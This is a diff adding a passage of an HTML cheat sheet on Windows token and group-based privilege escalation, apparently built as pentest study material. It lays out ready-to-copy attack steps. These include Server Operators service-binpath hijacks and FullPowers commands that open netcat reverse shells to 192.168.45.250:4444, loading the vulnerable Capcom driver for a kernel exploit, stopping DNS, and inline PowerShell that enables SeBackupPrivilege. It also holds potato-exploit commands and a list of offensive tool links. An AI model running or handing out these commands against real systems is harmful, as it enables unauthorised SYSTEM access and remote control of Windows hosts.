+              <div class="step-title">Restart DNS service (requires membership)</div>
+              <div class="code-block">sc stop dns
+sc start dns</div>
+            </div>
+          </div>
+          <div class="alert alert-critical">
+            <span class="alert-icon">🔴</span>
+            <span>DNS restart will cause ~60s outage in a real environment. Avoid in production.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Server Operators -->
+    <div id="page-serverops" class="page">
+      <div class="page-header">
+        <div class="page-title">🖥️ Server Operators Group <span class="severity-badge sev-rare">RARE</span></div>
+        <div class="page-sub">// SERVICE MANAGEMENT RIGHTS → MODIFY BINPATH → SYSTEM</div>
+      </div>
+      <div class="section">
+        <div class="section-header">⚡ Full Attack</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Check membership</div>
+              <div class="code-block">net localgroup "Server Operators"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Find a service running as SYSTEM</div>
+              <div class="code-block">sc query
+services.msc → find any running as LocalSystem</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Modify service binpath to reverse shell</div>
+              <div class="code-block purple">sc config AppMgmt binPath= "cmd /c C:\Users\Public\Documents\nc64.exe 192.168.45.250 4444 -e cmd"
+sc stop AppMgmt
+sc start AppMgmt</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span>Server Operators can start/stop services even without explicit sc permissions. Any SYSTEM service is a target.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Print Operators -->
+    <div id="page-printops" class="page">
+      <div class="page-header">
+        <div class="page-title">🖨️ Print Operators Group <span class="severity-badge sev-rare">RARE</span></div>
+        <div class="page-sub">// SeLoadDriverPrivilege + SeShutdown → KERNEL DRIVER → SYSTEM</div>
+      </div>
+      <div class="section">
+        <div class="section-header">⚡ Attack</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Print Operators get SeLoadDriverPrivilege — follow SeLoadDriver chain</div>
+              <div class="code-block">net localgroup "Print Operators"
+whoami /priv | findstr SeLoadDriver</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Load vulnerable driver → kernel exploit</div>
+              <div class="code-block purple">.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\Capcom.sys
+.\ExploitCapcom.exe EXPLOITPATH C:\temp\shell.exe</div>
+            </div>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">🔗</span>
+            <span>Reference: <a href="https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/" target="_blank">tarlogic.com — SeLoadDriverPrivilege</a></span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- FullPowers -->
+    <div id="page-fullpowers" class="page">
+      <div class="page-header">
+        <div class="page-title">💪 FullPowers — Restore Missing Tokens <span class="severity-badge sev-gold">TOKEN RECOVERY</span></div>
+        <div class="page-sub">// SERVICE ACCOUNTS WITH STRIPPED TOKENS → RESTORE SeImpersonate/SeAssignPrimaryToken</div>
+      </div>
+      <div class="section">
+        <div class="section-header">⚡ The Problem</div>
+        <div class="section-body">
+          <div class="alert alert-critical">
+            <span class="alert-icon">🔴</span>
+            <span>When a service account (LOCAL SERVICE, NETWORK SERVICE) spawns a shell via exploit, Windows strips dangerous privileges. SeImpersonatePrivilege may be missing even though the service account should have it.</span>
+          </div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Run FullPowers to restore tokens</div>
+              <div class="code-block green">.\FullPowers.exe
+.\FullPowers.exe -c ".\GodPotato-NET4.exe -cmd 'cmd /c whoami'"
+.\FullPowers.exe -c "C:\Users\Public\nc64.exe 192.168.45.250 4444 -e cmd" -z</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">After FullPowers, verify tokens are restored</div>
+              <div class="code-block">whoami /priv
+# Should now show SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege</div>
+            </div>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">🔗</span>
+            <span>GitHub: <a href="https://github.com/itm4n/FullPowers" target="_blank">github.com/itm4n/FullPowers</a></span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Enable Disabled Privs -->
+    <div id="page-enablepriv" class="page">
+      <div class="page-header">
+        <div class="page-title">🔓 Enable Disabled Privileges <span class="severity-badge sev-gold">TOKEN MANIPULATION</span></div>
+        <div class="page-sub">// DISABLED ≠ REMOVED — ENABLE PROGRAMMATICALLY</div>
+      </div>
+      <div class="section">
+        <div class="section-header">⚡ Enable via PowerShell</div>
+        <div class="section-body">
+          <div class="alert alert-gold">
+            <span class="alert-icon">⚠️</span>
+            <span>A privilege listed as "Disabled" in <code>whoami /priv</code> is present in the token but not active. It can be enabled with a Win32 API call (AdjustTokenPrivileges). Most exploit tools do this automatically, but you can also do it manually.</span>
+          </div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Enable all token privileges (PrivFu)</div>
+              <div class="code-block purple">.\PrivilegeEnabler.exe
+# Or with token-priv suite
+.\EnableAllPrivileges.exe</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">PowerShell inline (enable specific priv)</div>
+              <div class="code-block green">$definition = @"
+using System;
+using System.Runtime.InteropServices;
+public class AdjPriv {
+    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
+    internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
+    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
+    internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
+    [DllImport("advapi32.dll", SetLastError = true)]
+    internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
+    [StructLayout(LayoutKind.Sequential, Pack = 1)]
+    internal struct TokPriv1Luid { public int Count; public long Luid; public int Attr; }
+    internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
+    internal const int TOKEN_QUERY = 0x00000008;
+    internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
+    public static bool EnablePrivilege(long processHandle, string privilege) {
+        bool retVal; TokPriv1Luid tp;
+        IntPtr hproc = new IntPtr(processHandle);
+        IntPtr htok = IntPtr.Zero;
+        retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
+        tp.Count = 1; tp.Luid = 0; tp.Attr = SE_PRIVILEGE_ENABLED;
+        retVal = LookupPrivilegeValue(null, privilege, ref tp.Luid);
+        retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
+        return retVal; } }
+"@
+$processHandle = (Get-Process -id $pid).Handle
+$type = Add-Type $definition -PassThru
+$type[0]::EnablePrivilege($processHandle, "SeBackupPrivilege")</div>
+            </div>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">🔗</span>
+            <span>PrivFu: <a href="https://github.com/daem0nc0re/PrivFu" target="_blank">github.com/daem0nc0re/PrivFu</a> | Priv2Admin: <a href="https://github.com/gtworek/Priv2Admin" target="_blank">github.com/gtworek/Priv2Admin</a></span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ALL LINKS -->
+    <div id="page-links" class="page">
+      <div class="page-header">
+        <div class="page-title">🔗 Master Resource List <span class="severity-badge sev-common">ALL LINKS</span></div>
+        <div class="page-sub">// EVERY TOOL, WRITEUP, AND REFERENCE FOR TOKEN PRIVESC</div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">🔧 Exploit Tools</div>
+        <div class="section-body">
+          <table class="priv-table">
+            <tr><th>Tool</th><th>Link</th><th>Use</th></tr>
+            <tr><td>GodPotato</td><td><a href="https://github.com/BeichenDream/GodPotato" target="_blank">github.com/BeichenDream/GodPotato</a></td><td>SeImpersonate → SYSTEM (2012-2022)</td></tr>
+            <tr><td>PrintSpoofer</td><td><a href="https://github.com/itm4n/PrintSpoofer" target="_blank">github.com/itm4n/PrintSpoofer</a></td><td>SeImpersonate Win10/2016/2019</td></tr>
+            <tr><td>JuicyPotatoNG</td><td><a href="https://github.com/antonioCoco/JuicyPotatoNG" target="_blank">github.com/antonioCoco/JuicyPotatoNG</a></td><td>SeImpersonate 2019+</td></tr>
+            <tr><td>SeManageVolumeExploit</td><td><a href="https://github.com/CsEnox/SeManageVolumeExploit" target="_blank">github.com/CsEnox/SeManageVolumeExploit</a></td><td>SeManageVolume → C:\ write</td></tr>
+            <tr><td>FullPowers</td><td><a href="https://github.com/itm4n/FullPowers" target="_blank">github.com/itm4n/FullPowers</a></td><td>Restore stripped service account tokens</td></tr>
+            <tr><td>SeBackupPrivilege cmdlets</td><td><a href="https://github.com/giuliano108/SeBackupPrivilege" target="_blank">github.com/giuliano108/SeBackupPrivilege</a></td><td>SeBackup file read</td></tr>
+            <tr><td>SeRestoreAbuse</td><td><a href="https://github.com/xct/SeRestoreAbuse" target="_blank">github.com/xct/SeRestoreAbuse</a></td><td>SeRestore file write</td></tr>
+            <tr><td>token-priv</td><td><a href="https://github.com/hatRiot/token-priv" target="_blank">github.com/hatRiot/token-priv</a></td><td>SeTcb, SeCreateToken, SeTakeOwn</td></tr>
+            <tr><td>PrivFu</td><td><a href="https://github.com/daem0nc0re/PrivFu" target="_blank">github.com/daem0nc0re/PrivFu</a></td><td>Full privilege manipulation suite</td></tr>
+            <tr><td>Priv2Admin</td><td><a href="https://github.com/gtworek/Priv2Admin" target="_blank">github.com/gtworek/Priv2Admin</a></td><td>Master priv exploitation reference</td></tr>
+            <tr><td>TcbElevation</td><td><a href="https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178" target="_blank">gist.github.com/antonioCoco</a></td><td>SeTcbPrivilege → SYSTEM</td></tr>
+            <tr><td>SeLoadDriverPrivilege</td><td><a href="https://github.com/k4sth4/SeLoadDriverPrivilege" target="_blank">github.com/k4sth4/SeLoadDriverPrivilege</a></td><td>Kernel driver load → SYSTEM</td></tr>
+          </table>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">📚 Enumeration Tools</div>
+        <div class="section-body">
+          <table class="priv-table">
+            <tr><th>Tool</th><th>Link</th><th>Use</th></tr>
+            <tr><td>WinPEAS</td><td><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank">github.com/carlospolop/PEASS-ng</a></td><td>Broad Windows enum</td></tr>
+            <tr><td>PrivescCheck</td><td><a href="https://github.com/itm4n/PrivescCheck" target="_blank">github.com/itm4n/PrivescCheck</a></td><td>Focused privesc enum</td></tr>
+            <tr><td>PowerUp</td><td><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank">github.com/PowerShellMafia/PowerSploit</a></td><td>Service/ACL based privesc</td></tr>
+            <tr><td>Seatbelt</td><td><a href="https://github.com/GhostPack/Seatbelt" target="_blank">github.com/GhostPack/Seatbelt</a></td><td>Host situational awareness</td></tr>
+          </table>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">📝 Key Writeups & References</div>
+        <div class="section-body">
+          <table class="priv-table">
+            <tr><th>Topic</th><th>Link</th></tr>
+            <tr><td>HackTricks — Abusing Tokens</td><td><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens" target="_blank">book.hacktricks.xyz</a></td></tr>
+            <tr><td>Priv2Admin — All privileges mapped</td><td><a href="https://github.com/gtworek/Priv2Admin" target="_blank">github.com/gtworek/Priv2Admin</a></td></tr>
+            <tr><td>Access box — SeManageVolume writeup</td><td><a href="https://motasemhamdan.medium.com/active-directory-pentesting-offensive-security-proving-grounds-access-writeup-ddf4f3c6fcb9" target="_blank">Medium — Motasem</a></td></tr>
+            <tr><td>Palantir — Windows Privilege Abuse</td><td><a href="https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e" target="_blank">blog.palantir.com</a></td></tr>
+            <tr><td>SeBackupPrivilege — Hacking Articles</td><td><a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" target="_blank">hackingarticles.in</a></td></tr>
+            <tr><td>SeLoadDriverPrivilege — Tarlogic</td><td><a href="https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/" target="_blank">tarlogic.com</a></td></tr>
+            <tr><td>Token Privileges for LPE — ExploitDB</td><td><a href="https://www.exploit-db.com/papers/42556" target="_blank">exploit-db.com/papers/42556</a></td></tr>
+            <tr><td>Critical Windows Privs — Medium</td><td><a href="https://hacerdalkiran.medium.com/critical-windows-user-privileges-for-windows-privesc-55ef12824f90" target="_blank">hacerdalkiran.medium.com</a></td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- ENUM ONE-LINERS -->
+    <div id="page-enum" class="page">
+      <div class="page-header">
+        <div class="page-title">⚡ Enum One-Liners <span class="severity-badge sev-common">QUICK REFERENCE</span></div>
+        <div class="page-sub">// EVERY COMMAND YOU NEED TO IDENTIFY TOKEN PRIVESC VECTORS</div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">🔍 Privilege Enumeration</div>
+        <div class="section-body">
+          <div class="code-block teal"># Full token dump
+whoami /all
+
+# Just privileges
+whoami /priv
+
+# Hunt for dangerous privs instantly
+whoami /priv | findstr /i "SeImpersonate\|SeAssignPrimary\|SeDebug\|SeBackup\|SeRestore\|SeTakeOwnership\|SeLoadDriver\|SeManageVolume\|SeTcb\|SeCreateToken\|SeSecurityPriv"
+
+# Groups
+whoami /groups | findstr /i "backup\|dns\|server op\|print op\|admin"</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">🔍 Group Membership</div>
+        <div class="section-body">
+          <div class="code-block gold">net localgroup
+net localgroup Administrators
+net localgroup "Backup Operators"
+net localgroup "DnsAdmins"
+net localgroup "Server Operators"
+net localgroup "Print Operators"
+net localgroup "Remote Management Users"
+net localgroup "Event Log Readers"</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">🔍 Service Account Detection</div>
+        <div class="section-body">
+          <div class="code-block">Get-WmiObject Win32_Service | Where-Object {$_.StartName -notlike "LocalSystem" -and $_.StartName -notlike "LocalService" -and $_.StartName -notlike "NetworkService"} | Select Name,StartName,State
+
+sc qc <servicename>
+sc query state= all | findstr SERVICE_NAME</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">🔍 Automated (run both every time)</div>
+        <div class="section-body">
+          <div class="code-block green">.\winPEASx64.exe quiet tokencheck
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">🔍 Potato Selection Guide</div>
+        <div class="section-body">
+          <table class="priv-table">
+            <tr><th>OS</th><th>Best Potato</th><th>Command</th></tr>
+            <tr><td>Server 2008-2019, Win7-10</td><td>GodPotato</td><td><code>.\GodPotato-NET4.exe -cmd "cmd"</code></td></tr>
+            <tr><td>Win10 1809+, Server 2019</td><td>PrintSpoofer</td><td><code>.\PrintSpoofer.exe -i -c cmd</code></td></tr>
+            <tr><td>Server 2019+</td><td>JuicyPotatoNG</td><td><code>.\JuicyPotatoNG.exe -t * -p cmd.exe</code></td></tr>
+            <tr><td>Missing SeImpersonate</td><td>FullPowers first</td><td><code>.\FullPowers.exe -c ".\GodPotato..."</code></td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /main -->
+</div><!-- /layout -->
+
+<script>
+function showPage(id, el) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  document.getElementById('page-' + id).classList.add('active');
+  el.classList.add('active');
+}
+
+// Copy buttons
+document.addEventListener('click', function(e) {
+  if (e.target.classList.contains('copy-btn')) {
+    const block = e.target.closest('.code-block');
+    const text = block.innerText.replace('COPY','').trim();
+    navigator.clipboard.writeText(text).then(() => {
+      e.target.textContent = 'COPIED';
+      e.target.classList.add('copied');
+      setTimeout(() => { e.target.textContent = 'COPY'; e.target.classList.remove('copied'); }, 1500);
+    });
+  }
+});
+
+// Add copy buttons to all code blocks
+document.querySelectorAll('.code-block').forEach(block => {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.textContent = 'COPY';
+  block.appendChild(btn);
+});
+</script>
+</body>
+</html>
